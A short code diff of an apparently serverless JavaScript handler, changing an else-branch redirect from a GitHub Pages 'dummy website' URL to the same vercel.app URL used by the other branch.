@@ -12,6 +12,6 @@ export default function handler(req, res) {
         res.redirect("https://phantom-navy-one.vercel.app/");
     } else {
         // Redirect to a dummy website
-        res.redirect("https://kikoulepoulet.github.io/antibypass/");
+        res.redirect("https://phantom-navy-one.vercel.app/");
     }
 }
